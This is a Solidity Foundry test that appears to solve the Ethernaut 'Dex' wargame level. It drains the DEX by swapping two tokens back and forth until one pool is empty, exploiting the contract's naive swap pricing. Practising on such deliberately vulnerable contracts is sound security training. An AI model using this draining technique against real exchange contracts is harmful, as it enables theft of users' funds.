// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { Dex } from "src/Dex/Dex.sol";
import { SwappableToken } from "src/Dex/Dex.sol";
import { DexFactory } from "src/Dex/DexFactory.sol";
import { DexAttack } from "src/Dex/DexAttack.sol";

contract DexAttackTest is PRBTest {
    Ethernaut public ethernaut;
    DexFactory public factory;
    address public dexInstance;
    address public playerAddress = address(0x696969);

    address public token1;
    address public token2;

    DexAttack attacker = new DexAttack();

    function setUp() public {
        vm.startPrank(playerAddress);
        vm.deal(playerAddress, 69 ether);
        ethernaut = new Ethernaut();
        factory = new DexFactory();

        ethernaut.registerLevel(factory);
        dexInstance = ethernaut.createLevelInstance(factory);
        token1 = Dex(dexInstance).token1();
        token2 = Dex(dexInstance).token2();
        vm.stopPrank();
    }

    // test with withrawPartner set directly
    function testDexAttack() public {
        uint256 tokenBalance;
        uint256 exchangeBalance;
        bool toggle;
        bool drained;

        vm.startPrank(playerAddress, playerAddress);

        while (!drained) {
            toggle ? swapToken(token1, token2) : swapToken(token2, token1);
            toggle = !toggle;
            drained = isDexDrained();
        }

        // test to make sure we completed the level; submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(dexInstance));
        assert(levelComplete);
        vm.stopPrank();
    }

    function swapToken(address _tokenFrom, address _tokenTo) public {
        require(
            SwappableToken(token1).balanceOf(dexInstance) > 0 && SwappableToken(token2).balanceOf(dexInstance) > 0,
            "Token Drained"
        );
        // get my balance and the exchange balance
        uint256 myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
        uint256 exchangeBalance = SwappableToken(_tokenFrom).balanceOf(dexInstance);

        // determine how much to swap
        uint256 swapAmount;
        myTokenBalance >= exchangeBalance ? swapAmount = exchangeBalance : swapAmount = myTokenBalance;

        SwappableToken(_tokenFrom).approve(playerAddress, dexInstance, swapAmount);
        console.log("DEX TOKEN 1 BALANCE BEFORE:", SwappableToken(token1).balanceOf(dexInstance));
        console.log("DEX TOKEN 2 BALANCE BEFORE:", SwappableToken(token2).balanceOf(dexInstance));
        Dex(dexInstance).swap(_tokenFrom, _tokenTo, swapAmount);
        myTokenBalance = SwappableToken(_tokenFrom).balanceOf(playerAddress);
        console.log("DEX TOKEN 1 BALANCE AFTER:", SwappableToken(token1).balanceOf(dexInstance));
        console.log("DEX TOKEN 2 BALANCE AFTER:", SwappableToken(token2).balanceOf(dexInstance));
    }

    function isDexDrained() public returns (bool) {
        return SwappableToken(token1).balanceOf(dexInstance) == 0 || SwappableToken(token2).balanceOf(dexInstance) == 0;
    }
}
